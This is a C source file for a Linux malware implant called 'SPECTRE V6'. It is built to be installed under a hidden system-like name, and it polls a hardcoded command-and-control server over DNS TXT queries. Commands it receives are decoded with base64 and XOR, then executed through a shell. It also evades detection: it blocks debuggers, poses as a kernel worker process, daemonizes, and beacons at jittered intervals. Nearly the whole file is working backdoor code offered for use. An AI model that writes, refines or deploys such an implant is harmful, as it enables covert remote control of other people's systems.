/*
 * SPECTRE V6 GOLD MASTER - IMPLANT (PATCHED FINAL)
 * Target: Debian/Fedora (x86_64)
 * Compile: gcc implant.c -o /usr/libexec/.libsystemd-worker -lresolv -Os -s
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <resolv.h>
#include <arpa/nameser.h>

// --- CONFIGURATION ---
#define C2_IP "192.168.100.10"
#define DOMAIN "check.update.sys"
#define MASTER_KEY "PA8_PLATINUM_KEY_2025"

static int TEST_MODE = 0;

// --- CRYPTO ---
static void crypto_routine(uint8_t *data, size_t len) {
    size_t key_len = strlen(MASTER_KEY);
    for (size_t i = 0; i < len; i++) {
        data[i] ^= (uint8_t)(MASTER_KEY[i % key_len] ^ (i & 0xFF));
    }
}

static void validate_crypto(void) {
    char test_str[] = "PA8_VALIDATION";
    char original[] = "PA8_VALIDATION";
    size_t len = strlen(test_str);
    crypto_routine((uint8_t*)test_str, len);
    crypto_routine((uint8_t*)test_str, len);
    if (memcmp(test_str, original, len) != 0) _exit(EXIT_FAILURE);
}

// --- BASE64 (CORRIGÉ) ---
static char *decoding_table = NULL;

static void build_decoding_table(void) {
    const char encoding_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    decoding_table = malloc(256);
    if (!decoding_table) return;
    memset(decoding_table, 0, 256);
    for (int i = 0; i < 64; i++) decoding_table[(unsigned char)encoding_table[i]] = i;
}

static void cleanup_decoding_table(void) {
    if (decoding_table) { free(decoding_table); decoding_table = NULL; }
}

static unsigned char *base64_decode(const char *data, size_t input_len, size_t *output_len) {
    if (!decoding_table) build_decoding_table();
    if (!decoding_table || input_len % 4 != 0) return NULL;
    *output_len = input_len / 4 * 3;
    if (data[input_len - 1] == '=') (*output_len)--;
    if (data[input_len - 2] == '=') (*output_len)--;
    unsigned char *decoded = malloc(*output_len + 1);
    if (!decoded) return NULL;
    
    // CORRECTION APPLIQUÉE : i++ sorti de la condition ternaire
    for (size_t i = 0, j = 0; i < input_len;) {
        uint32_t a = data[i] == '=' ? 0 : decoding_table[(unsigned char)data[i]]; i++;
        uint32_t b = data[i] == '=' ? 0 : decoding_table[(unsigned char)data[i]]; i++;
        uint32_t c = data[i] == '=' ? 0 : decoding_table[(unsigned char)data[i]]; i++;
        uint32_t d = data[i] == '=' ? 0 : decoding_table[(unsigned char)data[i]]; i++;
        
        uint32_t triple = (a << 18) | (b << 12) | (c << 6) | d;
        if (j < *output_len) decoded[j++] = (triple >> 16) & 0xFF;
        if (j < *output_len) decoded[j++] = (triple >> 8) & 0xFF;
        if (j < *output_len) decoded[j++] = triple & 0xFF;
    }
    decoded[*output_len] = '\0';
    return decoded;
}

// --- EXECUTION ---
static void execute(const char *cmd) {
    if (!cmd || cmd[0] == '\0') return;
    pid_t pid = fork();
    if (pid == 0) {
        setsid();
        execl("/bin/sh", "sh", "-c", cmd, NULL);
        _exit(EXIT_FAILURE);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
    }
}

// --- BEACON DNS ---
static void beacon(void) {
    unsigned char nsbuf[4096];
    struct __res_state state;
    memset(&state, 0, sizeof(state));
    if (res_ninit(&state) != 0) return;
    
    state.nsaddr_list[0].sin_addr.s_addr = inet_addr(C2_IP);
    state.nsaddr_list[0].sin_family = AF_INET;
    state.nsaddr_list[0].sin_port = htons(53);
    state.nscount = 1;
    state.retry = 2;
    
    int len = res_nquery(&state, DOMAIN, ns_c_in, ns_t_txt, nsbuf, sizeof(nsbuf));
    if (len > 0) {
        ns_msg msg;
        if (ns_initparse(nsbuf, len, &msg) == 0) {
            int count = ns_msg_count(msg, ns_s_an);
            for (int i = 0; i < count; i++) {
                ns_rr rr;
                if (ns_parserr(&msg, ns_s_an, i, &rr) == 0 && ns_rr_type(rr) == ns_t_txt) {
                    const unsigned char *rdata = ns_rr_rdata(rr);
                    int rdlen = ns_rr_rdlen(rr);
                    char *full_payload = calloc(1, rdlen + 1);
                    if (!full_payload) continue;

                    int current_pos = 0, buffer_idx = 0;
                    while (current_pos < rdlen) {
                        unsigned char seg_len = rdata[current_pos++];
                        if (current_pos + seg_len > rdlen) break;
                        memcpy(full_payload + buffer_idx, rdata + current_pos, seg_len);
                        buffer_idx += seg_len;
                        current_pos += seg_len;
                    }
                    full_payload[buffer_idx] = '\0';

                    if (buffer_idx > 0) {
                        size_t dec_len;
                        unsigned char *cmd_bytes = base64_decode(full_payload, buffer_idx, &dec_len);
                        if (cmd_bytes) {
                            crypto_routine(cmd_bytes, dec_len);
                            if (dec_len > 0) execute((char*)cmd_bytes);
                            free(cmd_bytes);
                        }
                    }
                    free(full_payload);
                }
            }
        }
    }
    res_nclose(&state);
}

int main(int argc, char *argv[]) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--test-crypto") == 0) { validate_crypto(); return 0; }
        if (strcmp(argv[i], "--test") == 0) TEST_MODE = 1;
    }
    validate_crypto();
    if (ptrace(PTRACE_TRACEME, 0, NULL, 0) < 0) _exit(0);
    
    const char *fake_name = "[kworker/u4:0-events]";
    prctl(PR_SET_NAME, (unsigned long)fake_name);
    memset(argv[0], 0, strlen(argv[0]));
    strncpy(argv[0], fake_name, strlen(argv[0]));
    
    if (fork() != 0) _exit(0);
    if (setsid() < 0) _exit(1);
    
    srandom(time(NULL) ^ getpid());
    if (!TEST_MODE) sleep(random() % 120);
    
    close(STDIN_FILENO); close(STDOUT_FILENO); close(STDERR_FILENO);
    int sleep_time = TEST_MODE ? 60 : 300;
    
    while (1) {
        beacon();
        if (TEST_MODE) sleep(60);
        else {
            sleep_time = (sleep_time * 2);
            if (sleep_time > 1800) sleep_time = 1800;
            sleep(sleep_time + (random() % (sleep_time / 4)));
        }
    }
    cleanup_decoding_table();
    return 0;
}
